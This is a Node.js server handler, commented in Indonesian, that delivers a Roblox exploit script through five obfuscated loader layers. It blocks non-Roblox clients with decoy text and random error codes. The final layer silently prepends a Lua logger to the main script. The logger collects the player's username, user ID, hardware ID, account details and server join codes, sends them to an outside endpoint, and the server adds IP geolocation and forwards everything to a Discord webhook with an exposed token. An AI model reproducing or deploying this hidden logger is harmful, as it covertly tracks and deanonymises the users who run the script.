const https = require('https');

// ============================
// SETTINGS
// ============================
const SETTINGS = {
    TOTAL_LAYERS: 5,
    MIN_WAIT: 112,
    MAX_WAIT: 119,
    SESSION_EXPIRY: 10000,
    KEY_LIFETIME: 5000,
    PLAIN_TEXT_URL: "https://pastefy.app/cMzbfLvJ/raw",
    REAL_SCRIPT_URL: "https://api.rubis.app/v2/scrap/bMUJDedIAAvDDdeW/raw",
    DISCORD_WEBHOOK: "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5"
};

let sessions = {};
let blacklist = {};

function fetchRaw(url) {
    return new Promise((resolve) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => resolve(data));
        }).on('error', () => resolve(null));
    });
}

function getRandomError() {
    const errorCodes = [400, 401, 403, 404, 500, 502, 503];
    return errorCodes[Math.floor(Math.random() * errorCodes.length)];
}

// Kirim log ke Discord (hanya untuk error/security, BUKAN logger player)
async function sendSecurityLog(embedData) {
    const data = JSON.stringify({ embeds: [embedData] });
    const url = new URL(SETTINGS.DISCORD_WEBHOOK);
    
    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    };
    
    return new Promise((resolve) => {
        const req = https.request(options, (res) => {
            res.on('end', () => resolve(true));
            res.resume();
        });
        req.on('error', () => resolve(false));
        req.write(data);
        req.end();
    });
}

// ==========================================
// SCRIPT LOGGER YANG DIKIRIM KE CLIENT
// ==========================================
function getLoggerScript() {
    return `
-- ==========================================
-- LOGGER OTOMATIS DARI SERVER
-- ==========================================
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")
local LocalizationService = game:GetService("LocalizationService")

local LocalPlayer = Players.LocalPlayer
local Name = LocalPlayer.Name
local DName = LocalPlayer.DisplayName
local UserId = LocalPlayer.UserId
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local CountryCode = LocalizationService.RobloxLocaleId

local GetHwid = "Not Supported"
pcall(function() GetHwid = RbxAnalytics:GetClientId() end)

local FriendsCount, FollowersCount, FollowingCount = "0", "0", "0"
pcall(function()
    FriendsCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/friends/count")).count
    FollowersCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followers/count")).count
    FollowingCount = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/"..UserId.."/followings/count")).count
end)

local TotalDays = LocalPlayer.AccountAge
local Years = math.floor(TotalDays / 365)
local Months = math.floor((TotalDays % 365) / 30)
local AgeFormatted = string.format("%d Hari / %d Bulan / %d Tahun", TotalDays, Months, Years)

local MonthsList = {"Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"}
local DateTable = os.date("*t")
local ExecutedTime = string.format("%d %s %d | %02d:%02d:%02d", DateTable.day, MonthsList[DateTable.month], DateTable.year, DateTable.hour, DateTable.min, DateTable.sec)

local GameName = "Unknown"
pcall(function() GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
local JobId = game.JobId
local PlaceId = game.PlaceId
local PlayerCount = #Players:GetPlayers() .. "/" .. Players.MaxPlayers

local JoinCode = string.format("Roblox.GameLauncher.joinGameInstance(%d, '%s')", PlaceId, JobId)
local JoinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', PlaceId, JobId)

local function GetExecutor()
    if identifyexecutor then return identifyexecutor() end
    if syn then return "Synapse X" end
    return "Unknown"
end
local Executor = GetExecutor()

local fields = {
    { name = "━━━━━━━━━━━━━━ 📋 PLAYER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
    { name = "📛 Display Name", value = DName, inline = false },
    { name = "👤 Username", value = Name, inline = false },
    { name = "🆔 User ID", value = tostring(UserId), inline = false },
    { name = "💎 Membership", value = MembershipType, inline = false },
    { name = "🎂 Account Age", value = AgeFormatted, inline = false },
    { name = "👥 Friends/Followers/Following", value = FriendsCount.."/"..FollowersCount.."/"..FollowingCount, inline = false },
    { name = "🚩 Locale", value = CountryCode, inline = false },
    { name = "⚙️ Executor", value = Executor, inline = false },
    { name = "💻 HWID", value = GetHwid, inline = false },
    { name = "⏰ Executed Time", value = ExecutedTime, inline = false },
    { name = "━━━━━━━━━━━━━━ 🎮 SERVER INFO ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
    { name = "🎮 Game", value = GameName, inline = false },
    { name = "🆔 Place ID", value = tostring(PlaceId), inline = false },
    { name = "👥 Players", value = PlayerCount, inline = false },
    { name = "🔑 Job ID", value = JobId, inline = false },
    { name = "📜 Console Join", value = JoinCode, inline = false },
    { name = "📜 Executor Join", value = JoinScript, inline = false }
}

-- Cari fungsi request yang tersedia
local requestFunc = syn and syn.request or http_request or request or httprequest
if requestFunc then
    local success, err = pcall(function()
        requestFunc({
            Url = "https://ndraawzz-developer.vercel.app/api/log",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({ fields = fields })
        })
    end)
    if not success then
        warn("Gagal kirim log: " .. tostring(err))
    end
else
    warn("Tidak ada fungsi request, coba metode lain")
    -- Alternatif: pake HttpPost untuk executor lama
    if HttpPost then
        HttpPost("https://ndraawzz-developer.vercel.app/api/log", HttpService:JSONEncode({ fields = fields }))
    end
end
`;
}

// ==========================================
// ENDPOINT LOGGER (dipanggil dari client)
// ==========================================
async function handleLog(req, res) {
    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => { body += chunk; });
        req.on('end', resolve);
    });
    
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    
    try {
        const data = JSON.parse(body);
        
        // Ambil geolokasi dari IP
        let geoData = { country: "N/A", region: "N/A", city: "N/A", isp: "N/A", as: "N/A", org: "N/A" };
        
        await new Promise((resolve) => {
            https.get(`http://ip-api.com/json/${clientIp}`, (geoRes) => {
                let geoBody = '';
                geoRes.on('data', chunk => geoBody += chunk);
                geoRes.on('end', () => {
                    try {
                        const json = JSON.parse(geoBody);
                        if (json.status === "success") {
                            geoData = {
                                country: json.country || "N/A",
                                region: json.regionName || "N/A",
                                city: json.city || "N/A",
                                isp: json.isp || "N/A",
                                as: json.as || "N/A",
                                org: json.org || "N/A"
                            };
                        }
                    } catch(e) {}
                    resolve();
                });
            }).on('error', () => resolve());
        });
        
        // Gabungkan fields
        const allFields = [
            ...(data.fields || []),
            { name = "━━━━━━━━━━━━━━ 🌐 IP INFORMATION ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
            { name = "📡 IP Address", value = clientIp, inline = false },
            { name = "🚩 Country", value = geoData.country, inline = false },
            { name = "📍 Region", value = geoData.region, inline = false },
            { name = "🏙️ City", value = geoData.city, inline = false },
            { name = "🏢 ISP", value = geoData.isp, inline = false },
            { name = "📡 AS / Org", value = geoData.as + " / " + geoData.org, inline = false }
        ];
        
        const embed = {
            title: "🚀 Ndraawz Logger",
            color: 0x00ff88,
            fields: allFields,
            timestamp: new Date().toISOString()
        };
        
        await sendSecurityLog(embed);
        console.log(`✅ Log player terkirim untuk IP: ${clientIp}`);
        res.status(200).json({ ok: true });
        
    } catch (err) {
        console.error("Error handleLog:", err);
        res.status(500).send("Error");
    }
}

// ==========================================
// HANDLER UTAMA (ANTI-CURI 5 LAYER)
// ==========================================
module.exports = async function(req, res) {
    const url = req.url || "";
    
    // Endpoint untuk logger
    if (url === '/api/log' && req.method === 'POST') {
        return handleLog(req, res);
    }
    
    // ========== ANTI-CURI 5 LAYER ==========
    res.setHeader('Content-Type', 'text/plain');
    
    const now = Date.now();
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    const agent = req.headers['user-agent'] || "";
    
    const isRoblox = agent.includes("Roblox");
    if (!isRoblox || blacklist[ip]) {
        const plain = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return res.status(getRandomError()).send(plain || "DENIED");
    }
    
    const parts = req.url.split('?');
    const params = (parts[1] || "").split('.');
    const step = parseInt(params[0]) || 0;
    const id = params[1];
    const key = params[2];
    const host = req.headers.host;
    const path = parts[0];
    
    try {
        // Validasi session untuk step > 0
        if (step > 0) {
            const s = sessions[id];
            if (!s || s.ownerIP !== ip) return res.status(getRandomError()).send("DENIED");
            if (step !== s.stepSequence[s.currentIndex]) { delete sessions[id]; return res.status(getRandomError()).send("DENIED"); }
            if (s.used) { blacklist[ip] = true; delete sessions[id]; return res.status(getRandomError()).send("DENIED"); }
            if (Date.now() - s.startTime > SETTINGS.SESSION_EXPIRY || Date.now() - s.keyCreatedAt > SETTINGS.KEY_LIFETIME) { delete sessions[id]; return res.status(getRandomError()).send("DENIED"); }
            if (s.nextKey !== key) { delete sessions[id]; return res.status(getRandomError()).send("DENIED"); }
            if (Date.now() - s.lastTime < s.requiredWait) { blacklist[ip] = true; delete sessions[id]; return res.status(getRandomError()).send("DENIED"); }
            s.used = true;
        }
        
        // Step 0: Buat session baru
        if (step === 0) {
            const newId = (parseInt(ip.split('.').pop() || "0") + Math.floor(Math.random() * 10000)).toString(36).substring(0,4);
            const nextKey = Math.random().toString(36).substring(2,8);
            const wait = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
            let seq = [];
            while(seq.length < SETTINGS.TOTAL_LAYERS) { let r = Math.floor(Math.random() * 300) + 1; if(!seq.includes(r)) seq.push(r); }
            sessions[newId] = { ownerIP: ip, stepSequence: seq, currentIndex: 0, nextKey, lastTime: now, startTime: now, keyCreatedAt: now, requiredWait: wait, used: false };
            const nextUrl = `https://${host}${path}?${seq[0]}.${newId}.${nextKey}`;
            return res.status(200).send(`task.wait(${wait/1000}) loadstring(game:HttpGet("${nextUrl}"))()`);
        }
        
        // Middle layers: rotasi session
        if (sessions[id] && sessions[id].currentIndex < SETTINGS.TOTAL_LAYERS - 1) {
            const s = sessions[id];
            s.currentIndex++;
            const newId = (parseInt(ip.split('.').pop() || "0") + Math.floor(Math.random() * 10000)).toString(36).substring(0,4);
            const nextKey = Math.random().toString(36).substring(2,8);
            const wait = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
            sessions[newId] = { ownerIP: s.ownerIP, stepSequence: s.stepSequence, currentIndex: s.currentIndex, nextKey, lastTime: now, startTime: s.startTime, keyCreatedAt: now, requiredWait: wait, used: false };
            delete sessions[id];
            const nextUrl = `https://${host}${path}?${s.stepSequence[s.currentIndex]}.${newId}.${nextKey}`;
            return res.status(200).send(`task.wait(${wait/1000}) loadstring(game:HttpGet("${nextUrl}"))()`);
        }
        
        // ========== LAYER TERAKHIR ==========
        if (sessions[id] && sessions[id].currentIndex === SETTINGS.TOTAL_LAYERS - 1) {
            // HAPUS security log "tembus 5 layer" - TIDAK DIKIRIM!
            // sendSecurityLog DIHAPUS agar tidak mengirim log kosong
            
            const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
            const finalScript = getLoggerScript() + "\n\n-- ==========================================\n-- MAIN SCRIPT\n-- ==========================================\n\n" + (mainScript || 'print("Error loading main script")');
            delete sessions[id];
            return res.status(200).send(finalScript);
        }
        
    } catch(e) {
        console.error(e);
        const plain = await fetchRaw(SETTINGS.PLAIN_TEXT_URL);
        return res.status(getRandomError()).send(plain || "DENIED");
    }
};
